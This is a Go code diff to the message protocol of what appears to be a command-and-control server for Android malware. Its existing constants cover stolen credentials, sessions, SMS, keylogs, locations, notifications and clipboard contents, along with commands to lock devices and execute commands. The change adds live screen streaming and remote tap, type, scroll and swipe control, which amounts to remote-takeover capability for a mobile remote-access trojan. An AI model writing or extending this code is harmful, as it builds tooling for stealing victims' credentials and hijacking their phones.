@@ -7,34 +7,42 @@ import (
 
 // Message types for C2 <-> Device protocol
 const (
-	MsgRegister    = "register"
-	MsgHeartbeat   = "heartbeat"
-	MsgData        = "data"
-	MsgCommand     = "command"
-	MsgCommandAck  = "command_ack"
-	MsgError       = "error"
+	MsgRegister     = "register"
+	MsgHeartbeat    = "heartbeat"
+	MsgData         = "data"
+	MsgCommand      = "command"
+	MsgCommandAck   = "command_ack"
+	MsgError        = "error"
+	MsgScreenState  = "screen_state"
+	MsgStreamFrame  = "stream_frame"
 )
 
 // Data types sent by devices
 const (
-	DataTypeCredential    = "credential"
-	DataTypeSession       = "session"
-	DataTypeFile          = "file"
-	DataTypeSMS           = "sms"
-	DataTypeKeylog        = "keylog"
-	DataTypeLocation      = "location"
-	DataTypeNotification  = "notification"
-	DataTypeClipboard     = "clipboard"
+	DataTypeCredential   = "credential"
+	DataTypeSession      = "session"
+	DataTypeFile         = "file"
+	DataTypeSMS          = "sms"
+	DataTypeKeylog       = "keylog"
+	DataTypeLocation     = "location"
+	DataTypeNotification = "notification"
+	DataTypeClipboard    = "clipboard"
 )
 
 // Command types sent to devices
 const (
-	CmdStartSweep   = "start_sweep"
-	CmdStopSweep    = "stop_sweep"
-	CmdLockDevice   = "lock_device"
+	CmdStartSweep    = "start_sweep"
+	CmdStopSweep     = "stop_sweep"
+	CmdLockDevice    = "lock_device"
 	CmdReleaseDevice = "release_device"
-	CmdExecCommand  = "exec_command"
-	CmdUpdateConfig = "update_config"
+	CmdExecCommand   = "exec_command"
+	CmdUpdateConfig  = "update_config"
+	CmdStartStream   = "start_stream"
+	CmdStopStream    = "stop_stream"
+	CmdTap           = "tap"
+	CmdType          = "type"
+	CmdScroll        = "scroll"
+	CmdSwipe         = "swipe"
 )
 
 type DeviceInfo struct {
@@ -57,10 +65,12 @@ type Device struct {
 	APiLevel        int       `json:"api_level"`
 	IPAddress       string    `json:"ip_address"`
 	Status          string    `json:"status"`
+	ScreenState     string    `json:"screen_state,omitempty"`
 	FirstSeen       time.Time `json:"first_seen"`
 	LastSeen        time.Time `json:"last_seen"`
 }
 
+// WSMessage is the top-level envelope for all WebSocket messages
 type WSMessage struct {
 	Type      string          `json:"type"`
 	DeviceID  string          `json:"device_id,omitempty"`
@@ -72,6 +82,7 @@ type WSMessage struct {
 	Error     string          `json:"error,omitempty"`
 	Payload   string          `json:"payload,omitempty"` // base64 encrypted
 	DataType  string          `json:"data_type,omitempty"`
+	Binary    bool            `json:"binary,omitempty"`
 	Timestamp int64           `json:"timestamp,omitempty"`
 }
 
@@ -165,4 +176,40 @@ type NotificationData struct {
 type ClipboardData struct {
 	Content   string `json:"content"`
 	Timestamp int64  `json:"timestamp"`
+}
+
+type ScreenStateData struct {
+	State     string `json:"state"`
+	Timestamp int64  `json:"timestamp"`
+}
+
+type StreamFrameData struct {
+	DeviceID  string `json:"device_id"`
+	FrameID   int    `json:"frame_id"`
+	Data      string `json:"data"` // base64 JPEG
+}
+
+type TapParams struct {
+	X float64 `json:"x"`
+	Y float64 `json:"y"`
+}
+
+type TypeParams struct {
+	Text string `json:"text"`
+}
+
+type ScrollParams struct {
+	Direction string `json:"direction"`
+}
+
+type SwipeParams struct {
+	X1 float64 `json:"x1"`
+	Y1 float64 `json:"y1"`
+	X2 float64 `json:"x2"`
+	Y2 float64 `json:"y2"`
+}
+
+type StreamParams struct {
+	Quality string `json:"quality"`
+	FPS     int    `json:"fps"`
 }
